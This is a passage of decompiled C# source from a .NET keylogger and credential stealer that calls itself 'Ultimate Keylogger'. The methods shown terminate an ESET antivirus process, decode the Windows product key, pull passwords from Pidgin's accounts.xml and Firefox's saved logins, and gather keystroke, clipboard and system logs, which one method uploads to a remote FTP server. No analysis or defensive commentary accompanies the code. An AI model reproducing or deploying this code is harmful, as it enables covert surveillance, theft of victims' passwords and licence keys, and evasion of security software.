							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class34.MoveFileEx(text5, (string)null, 4);
								Class34.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class31.hashtable_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static void smethod_138(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "egui", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern IntPtr FindResource(IntPtr intptr_0, string string_0, string string_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CallNextHookEx(int int_0, int int_1, int int_2, Form1.Class5.Struct0 struct0_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int lstrlenA(IntPtr intptr_0);

	static void smethod_139(Class12 class12_0, IntPtr intptr_0)
	{
		Marshal.FreeCoTaskMem(intptr_0);
	}

	static string smethod_140(string string_0, string string_1)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue(string_1, string_0, (object)0));
		if (objectValue == null)
		{
			return "N/A";
		}
		string text = "";
		int num = Information.LBound((Array)objectValue, 1);
		int num2 = Information.UBound((Array)objectValue, 1);
		checked
		{
			for (int i = num; i <= num2; i++)
			{
				text = text + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1] { i }, (string[])null)));
			}
			int num3 = 52;
			string[] array = new string[25]
			{
				"B", "C", "D", "F", "G", "H", "J", "K", "M", "P",
				"Q", "R", "T", "V", "W", "X", "Y", "2", "3", "4",
				"6", "7", "8", "9", null
			};
			int num4 = 29;
			int num5 = 15;
			string[] array2 = new string[16];
			string[] array3 = new string[31];
			string text2 = "";
			int num6 = 67;
			for (int j = 52; j <= num6; j++)
			{
				array2[j - num3] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1] { j }, (string[])null));
				text2 = text2 + " " + Conversion.Hex((object)array2[j - num3]);
			}
			string text3 = "";
			for (int k = num4 - 1; k >= 0; k += -1)
			{
				int num7;
				unchecked
				{
					if (checked(k + 1) % 6 == 0)
					{
						array3[k] = "-";
						text3 += "-";
						continue;
					}
					num7 = 0;
				}
				for (int l = num5 - 1; l >= 0; l += -1)
				{
					int num8 = (int)((long)Math.Round((double)num7 * 256.0) | Conversions.ToLong(array2[l]));
					unchecked
					{
						array2[l] = Conversions.ToString(num8 / 24);
						num7 = num8 % 24;
					}
				}
				array3[k] = array[num7];
				text3 += array[num7];
			}
			return Strings.StrReverse(text3);
		}
	}

	static void smethod_141(Form1 form1_0)
	{
		form1_0.string_73 = form1_0.string_45 + "\\Ultimate Keylogger " + form1_0.string_70 + "  On " + ((ServerComputer)Class1.smethod_0()).get_Name() + " 's ComputerAt" + form1_0.string_72 + ".txt";
		form1_0.vmethod_104().set_Text("Ftp Count :  " + form1_0.string_70);
		string text = "";
		string text2 = "";
		StreamWriter streamWriter = new StreamWriter(form1_0.string_45 + "\\Ultimate Keylogger " + form1_0.string_70 + "  On " + ((ServerComputer)Class1.smethod_0()).get_Name() + " 's ComputerAt" + form1_0.string_72 + ".txt", append: true);
		streamWriter.Write("    Ultimate Keylogger " + ((ServerComputer)Class1.smethod_0()).get_Name() + " 's Computer At " + form1_0.string_72 + form1_0.string_61 + text + form1_0.string_61 + text2 + form1_0.string_61 + form1_0.string_61 + "ComputerInformation" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_128().get_Text() + form1_0.string_61 + form1_0.string_61 + "Installed" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_100().get_Text() + form1_0.string_61 + form1_0.string_61 + "+------    logs    -------+ " + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_6().get_Text() + form1_0.string_61 + form1_0.string_61 + "ClipBoard Logs" + form1_0.string_61 + form1_0.string_60 + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_102().get_Text() + form1_0.string_61 + form1_0.string_61 + "Cd Keys" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_90().get_Text());
		streamWriter.Close();
		((TextBoxBase)form1_0.vmethod_6()).Clear();
		string text3 = form1_0.vmethod_4().get_Text();
		string text4 = form1_0.vmethod_2().get_Text();
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + form1_0.vmethod_0().get_Text() + "/" + form1_0.vmethod_12().get_Text() + "/Ultimate Keylogger " + ((ServerComputer)Class1.smethod_0()).get_Name() + " 's Computer " + form1_0.string_72 + " Log " + form1_0.string_70 + ".txt");
		ftpWebRequest.Credentials = new NetworkCredential(text3, text4);
		ftpWebRequest.Method = "STOR";
		byte[] array = File.ReadAllBytes(form1_0.string_73);
		Stream requestStream = ftpWebRequest.GetRequestStream();
		requestStream.Write(array, 0, array.Length);
		requestStream.Close();
		requestStream.Dispose();
		((TextBoxBase)form1_0.vmethod_6()).Clear();
		form1_0.string_70 = Conversions.ToString(Conversions.ToDouble(form1_0.string_70) + 1.0);
	}

	static string smethod_142(IntPtr intptr_0, Class8 class8_0)
	{
		return Marshal.PtrToStringUni(intptr_0);
	}

	static void smethod_143(string string_0, Class29 class29_0)
	{
		if (Class34.sqlite3_open(Class34.smethod_160(class29_0, string_0), ref class29_0.intptr_0) != 0)
		{
			class29_0.intptr_0 = IntPtr.Zero;
			throw new Exception("Error with opening database " + string_0 + "!");
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "FileTimeToSystemTime", ExactSpelling = true, SetLastError = true)]
	static extern int FileTimeToSystemTime_1(ref Class16.Struct11 struct11_0, ref Class16.Struct13 struct13_0);

	static void smethod_144(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string[] array = default(string[]);
		string[] array2 = default(string[]);
		string text5 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 388:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_004c;
						case 7:
							goto IL_0051;
						case 8:
							goto IL_006c;
						case 9:
							goto IL_0071;
						case 10:
							goto IL_008e;
						case 11:
							goto IL_00a0;
						case 14:
							goto IL_00b0;
						case 15:
						case 16:
							goto IL_00be;
						case 17:
							goto IL_00d0;
						case 18:
							goto IL_00df;
						case 19:
							goto IL_00ea;
						case 20:
							goto IL_00f0;
						case 12:
						case 13:
							goto IL_00f6;
						case 21:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 22:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00ea:
					num5 = checked(num5 + 1);
					goto IL_00f0;
					IL_0008:
					num = 2;
					text = Interaction.Environ("APPDATA") + "\\.purple\\accounts.xml";
					goto IL_0020;
					IL_0020:
					num = 3;
					text2 = Conversions.ToString(1);
					goto IL_002a;
					IL_002a:
					num = 4;
					text3 = "\r\n";
					goto IL_0033;
					IL_0033:
					num = 5;
					text2 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().OpenTextFileReader(text).ReadToEnd();
					goto IL_004c;
					IL_004c:
					num = 6;
					text4 = null;
					goto IL_0051;
					IL_0051:
					num = 7;
					array = text2.Split(new char[1] { '\r' });
					goto IL_006c;
					IL_006c:
					num = 8;
					text2 = null;
					goto IL_0071;
					IL_0071:
					num = 9;
					array2 = array;
					num5 = 0;
					goto IL_007c;
					IL_007c:
					if (num5 >= array2.Length)
					{
						break;
					}
					text5 = array2[num5];
					goto IL_008e;
					IL_00f0:
					num = 20;
					goto IL_007c;
					IL_008e:
					num = 10;
					if (text5.Contains("<protocol>"))
					{
						goto IL_00a0;
					}
					goto IL_00f6;
					IL_00a0:
					num = 11;
					text4 = text4 + text5 + text3;
					goto IL_00f6;
					IL_00f6:
					num = 13;
					if (text5.Contains("<name>"))
					{
						goto IL_00b0;
					}
					goto IL_00be;
					IL_00b0:
					num = 14;
					text4 = text4 + text5 + text3;
					goto IL_00be;
					IL_00be:
					num = 16;
					if (text5.Contains("<password>"))
					{
						goto IL_00d0;
					}
					goto IL_00ea;
					IL_00d0:
					num = 17;
					text4 = text4 + text5 + text3 + text3;
					goto IL_00df;
					IL_00df:
					num = 18;
					form1_0.string_51 = text4;
					goto IL_00ea;
					end_IL_0000_2:
					break;
				}
				num = 21;
				form1_0.string_51 = text4;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 388;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_145(Class18 class18_0)
	{
		return class18_0.string_1;
	}

	static void smethod_146(Class41.Class44 class44_0, int int_0, int int_1)
	{
		if ((class44_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class44_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class44_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class44_0.byte_0, num, class44_0.byte_0, class44_0.int_0, int_0);
				class44_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class44_0.byte_0[class44_0.int_0++] = class44_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class34.smethod_68(class44_0, num, int_0, int_1);
		}
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CloseEnumIdentitiesHandle(int int_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegQueryValueExA", ExactSpelling = true, SetLastError = true)]
	static extern int RegQueryValueExA_1(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, ref int int_2, IntPtr intptr_0, ref int int_3);

	static int smethod_147(ref DataTable dataTable_0, IntPtr intptr_0, Class29 class29_0)
	{
		dataTable_0 = new DataTable("resultTable");
		int num = Class34.sqlite3_step(intptr_0);
		checked
		{
			if (num == 100)
			{
				int num2 = Class34.sqlite3_column_count(intptr_0);
				string text = "";
				int num3 = 0;
				object[] array = new object[num2 - 1 + 1];
				int num4 = num2 - 1;
				for (int i = 0; i <= num4; i++)
				{
					text = Class34.smethod_103(class29_0, Class34.sqlite3_column_name(intptr_0, i));
					switch (Class34.sqlite3_column_type(intptr_0, i))
					{
					default:
						dataTable_0.Columns.Add(text, Type.GetType("System.String"));
						array[i] = "";
						break;
					case 1:
						dataTable_0.Columns.Add(text, Type.GetType("System.Int32"));
						array[i] = Class34.sqlite3_column_int(intptr_0, i);
						break;
					case 2:
						dataTable_0.Columns.Add(text, Type.GetType("System.Single"));
						array[i] = Class34.sqlite3_column_double(intptr_0, i);
						break;
					case 3:
						dataTable_0.Columns.Add(text, Type.GetType("System.String"));
						array[i] = Class34.smethod_103(class29_0, Class34.sqlite3_column_text(intptr_0, i));
						break;
					case 4:
						dataTable_0.Columns.Add(text, Type.GetType("System.String"));
						array[i] = Class34.smethod_103(class29_0, Class34.sqlite3_column_blob(intptr_0, i));
						break;
					}
				}
				dataTable_0.Rows.Add(array);
			}
			return Class34.sqlite3_step(intptr_0);
		}
	}

	static string smethod_148(Class10 class10_0)
	{
		int int_ = default(int);
		string result;
		if (Class34.SHGetSpecialFolderLocation(0, 38, ref int_) == 0)
		{
			string string_ = new string('\0', 512);
			int num = Class34.SHGetPathFromIDListA(int_, ref string_);
			result = Strings.Left(string_, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
		}
		else
		{
			result = null;
		}
		Class34.LocalFree_1(int_);
		return result;
	}

	static bool smethod_149(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "lstrlenA", ExactSpelling = true, SetLastError = true)]
	static extern int lstrlenA_1(IntPtr intptr_0);

	static void smethod_150(Form1 form1_0)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		string text = "SELECT * FROM __InstanceOperationEvent WITHIN 10 WHERE TargetInstance ISA \"Win32_DiskDrive\"";
		form1_0.vmethod_154(new ManagementEventWatcher(text));
		form1_0.vmethod_153().Start();
	}

	[DllImport("sqlite3")]
	static extern IntPtr sqlite3_column_text(IntPtr intptr_0, int int_0);

	static string smethod_151(Form1 form1_0, string string_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamReader streamReader = default(StreamReader);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 66:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0007:
					num = 2;
					streamReader = new StreamReader(string_0);
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				text = streamReader.ReadToEnd().ToString();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 66;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "FileTimeToLocalFileTime", ExactSpelling = true, SetLastError = true)]
	static extern int FileTimeToLocalFileTime_1(ref Class16.Struct11 struct11_0, ref Class16.Struct11 struct11_1);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SHGetPathFromIDListA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static string smethod_152(Form1 form1_0, string string_0)
	{
		object obj = null;
		object obj2 = default(object);
		object obj3 = default(object);
		if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(string_0), (object)1, ref obj3, ref obj2))
		{
			do
			{
				object obj4 = Strings.Mid(string_0, Conversions.ToInteger(obj2), 2);
				obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)"&h", obj4))))));
				obj2 = Operators.AddObject(obj2, (object)1);
			}
			while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
		}
		return Conversions.ToString(obj);
	}

	static void smethod_153()
	{
		string text = null;
		bool flag = false;
		long num = 0L;
		_ = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
		string[] directories = Directory.GetDirectories(path);
		string[] array = directories;
		foreach (string text2 in array)
		{
			if (flag)
			{
				break;
			}
			string[] files = Directory.GetFiles(text2);
			string[] array2 = files;
			foreach (string text3 in array2)
			{
				if (flag)
				{
					break;
				}
				if (Regex.IsMatch(text3, "signons.sqlite"))
				{
					Class34.smethod_100(text2);
					Class21.string_0 = text3;
				}
			}
		}
		string string_ = Class21.string_0;
		Class21.Struct21 @struct = default(Class21.Struct21);
		Class21.Struct21 struct21_ = default(Class21.Struct21);
		Class21.Struct21 struct21_2 = default(Class21.Struct21);
		Class29 class29_ = new Class29(string_);
		DataTable dataTable = Class34.smethod_66("SELECT * FROM moz_logins;", class29_);
		DataTable dataTable2 = Class34.smethod_66("SELECT * FROM moz_disabledHosts;", class29_);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = dataTable2.Rows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				_ = (DataRow)enumerator.Current;
				text = text + Environment.NewLine + "------------------".ToString();
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		num = Class34.smethod_85();
		Class34.smethod_89(bool_0: true, 0L, num);
		checked
		{
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = dataTable.Rows.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator2.Current;
					string text4 = Convert.ToString(dataRow["formSubmitURL"].ToString());
					text = text + Environment.NewLine + "Site: " + text4;
					StringBuilder stringBuilder = new StringBuilder(dataRow["encryptedUsername"].ToString());
					IntPtr zero = IntPtr.Zero;
					IntPtr zero2 = IntPtr.Zero;
					int length = stringBuilder.Length;
					int value = Class34.smethod_86(zero2, length, stringBuilder, zero);
					IntPtr ptr = new IntPtr(value);
					Class21.Struct21 struct21_3 = (Class21.Struct21)Marshal.PtrToStructure(ptr, typeof(Class21.Struct21));
					if (Class34.smethod_127(0, ref struct21_3, ref struct21_) == 0 && struct21_.int_2 != 0)
					{
						byte[] array3 = new byte[struct21_.int_2 - 1 + 1];
						ptr = new IntPtr(struct21_.int_1);
						Marshal.Copy(ptr, array3, 0, struct21_.int_2);
						text = text + Environment.NewLine + "User name: " + Encoding.ASCII.GetString(array3);
					}
					StringBuilder stringBuilder2 = new StringBuilder(dataRow["encryptedPassword"].ToString());
					zero = IntPtr.Zero;
					zero2 = IntPtr.Zero;
					length = stringBuilder2.Length;
					int value2 = Class34.smethod_86(zero2, length, stringBuilder2, zero);
					ptr = new IntPtr(value2);
					Class21.Struct21 struct21_4 = (Class21.Struct21)Marshal.PtrToStructure(ptr, typeof(Class21.Struct21));
					if (Class34.smethod_127(0, ref struct21_4, ref struct21_2) == 0 && struct21_2.int_2 != 0)
					{
						byte[] array3 = new byte[struct21_2.int_2 - 1 + 1];
						ptr = new IntPtr(struct21_2.int_1);
						Marshal.Copy(ptr, array3, 0, struct21_2.int_2);
						text = text + Environment.NewLine + "Password: " + Encoding.ASCII.GetString(array3) + Environment.NewLine;
					}
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
			Class34.smethod_8(Class1.smethod_2()).vmethod_86().set_Text(Class34.smethod_8(Class1.smethod_2()).vmethod_86().get_Text() + text + Environment.NewLine);
			Class34.smethod_8(Class1.smethod_2()).vmethod_86().set_Text(Class34.smethod_8(Class1.smethod_2()).vmethod_86().get_Text() + "----------------" + Environment.NewLine);
		}
	}

	static void smethod_154(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		RegistryKey registryKey = default(RegistryKey);
		string[] subKeyNames = default(string[]);
		int num5 = default(int);
		string text2 = default(string);
		RegistryKey registryKey2 = default(RegistryKey);
		string text3 = default(string);
		IEnumerator enumerator = default(IEnumerator);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				TextBox val;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 381:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001c;
						case 4:
							goto IL_003b;
						case 5:
							goto IL_0055;
						case 6:
							goto IL_006a;
						case 7:
							goto IL_007e;
						case 8:
							goto IL_0094;
						case 11:
							goto IL_00ab;
						case 9:
						case 10:
							goto IL_00b4;
						case 12:
							goto IL_00bc;
						case 13:
							goto IL_00e2;
						case 14:
							goto IL_0108;
						default:
							goto end_IL_0000;
						case 15:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00e2:
					num = 13;
					val = form1_0.vmethod_100();
					val.set_Text(val.get_Text() + Environment.NewLine + text);
					goto IL_0108;
					IL_0008:
					num = 2;
					registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", writable: false);
					goto IL_001c;
					IL_001c:
					num = 3;
					subKeyNames = registryKey.GetSubKeyNames();
					num5 = 0;
					goto IL_002a;
					IL_002a:
					if (num5 < subKeyNames.Length)
					{
						text2 = subKeyNames[num5];
						goto IL_003b;
					}
					goto IL_00bc;
					IL_0108:
					num = 14;
					goto IL_010c;
					IL_003b:
					num = 4;
					registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\" + text2, writable: false);
					goto IL_0055;
					IL_0055:
					num = 5;
					if (registryKey2.GetValueNames().Contains("DisplayName"))
					{
						goto IL_006a;
					}
					goto IL_00b4;
					IL_006a:
					num = 6;
					text3 = Conversions.ToString(registryKey2.GetValue("DisplayName"));
					goto IL_007e;
					IL_007e:
					num = 7;
					if (!form1_0.vmethod_106().get_Items().Contains((object)text3))
					{
						goto IL_0094;
					}
					goto IL_00b4;
					IL_0094:
					num = 8;
					form1_0.vmethod_106().get_Items().Add((object)text3);
					goto IL_00b4;
					IL_00b4:
					num5 = checked(num5 + 1);
					goto IL_00ab;
					IL_00ab:
					num = 11;
					goto IL_002a;
					IL_00bc:
					num = 12;
					enumerator = form1_0.vmethod_106().get_Items().GetEnumerator();
					goto IL_010c;
					IL_010c:
					if (enumerator.MoveNext())
					{
						text = Conversions.ToString(enumerator.Current);
						goto IL_00e2;
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0000_2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 381;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static byte[] smethod_155(Guid guid_0, Class14 class14_0, Guid guid_1, string string_0)
	{
		byte[] array = null;
		int pcbData = default(int);
		IntPtr ppbData = default(IntPtr);
		class14_0.ginterface3_0.ReadItem(class14_0.enum1_0, ref guid_0, ref guid_1, string_0, ref pcbData, ref ppbData, 0, 0);
		if (ppbData != IntPtr.Zero)
		{
			array = new byte[checked(pcbData - 1 + 1)];
			Marshal.Copy(ppbData, array, 0, pcbData);
		}
		return array;
	}

	static bool smethod_156(Class41.Class43 class43_0)
	{
		return class43_0.int_0 == class43_0.int_1;
	}

	static object smethod_157(ref string string_0, Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		object obj;
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.shell", ""));
					object[] array = new object[1] { string_0 };
					bool[] array2 = new bool[1] { true };
					object obj2 = NewLateBinding.LateGet(objectValue, (Type)null, "regread", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					obj = RuntimeHelpers.GetObjectValue(obj2);
					goto end_IL_0000;
				}
				case 121:
					num = -1;
					switch (num2)
					{
					case 2:
						obj = null;
						goto end_IL_0000;
					}
					break;
				}
				goto IL_00b3;
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 121;
				continue;
			}
			break;
			IL_00b3:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		object result = obj;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static int smethod_158(byte[] byte_0, Class41.Class44 class44_0, int int_0, int int_1)
	{
		int num = class44_0.int_0;
		if (int_1 > class44_0.int_1)
		{
			int_1 = class44_0.int_1;
		}
		else
		{
			num = (class44_0.int_0 - class44_0.int_1 + int_1) & 0x7FFF;
		}
		int num2 = int_1;
		int num3 = int_1 - num;
		if (num3 > 0)
		{
			Array.Copy(class44_0.byte_0, 32768 - num3, byte_0, int_0, num3);
			int_0 += num3;
			int_1 = num;
		}
		Array.Copy(class44_0.byte_0, num - int_1, byte_0, int_0, int_1);
		class44_0.int_1 -= num2;
		if (class44_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetForegroundWindow();

	static ICryptoTransform smethod_159(bool bool_0, byte[] byte_0, byte[] byte_1, Class40 class40_0)
	{
		class40_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class40_0.object_0, new object[1] { byte_1 });
		class40_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class40_0.object_0, new object[1] { byte_0 });
		MethodInfo method = class40_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class40_0.object_0, new object[0]);
	}

	static IntPtr smethod_160(Class29 class29_0, string string_0)
	{
		if (string_0 == null)
		{
			return IntPtr.Zero;
		}
		Encoding uTF = Encoding.UTF8;
		byte[] bytes = uTF.GetBytes(string_0);
		checked
		{
			int num = bytes.Length + 1;
			IntPtr intPtr = Class34.HeapAlloc(Class34.GetProcessHeap(), 0u, (uint)num);
			Marshal.Copy(bytes, 0, intPtr, bytes.Length);
			Marshal.WriteByte(intPtr, bytes.Length, 0);
			return intPtr;
		}
	}

	[DllImport("sqlite3")]
	static extern IntPtr sqlite3_column_blob(IntPtr intptr_0, int int_0);

	static void smethod_161(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		IEnumerator<Class18> enumerator = default(IEnumerator<Class18>);
		Class18 current = default(Class18);
		IEnumerator<Class17> enumerator2 = default(IEnumerator<Class17>);
		Class17 current2 = default(Class17);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 298:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
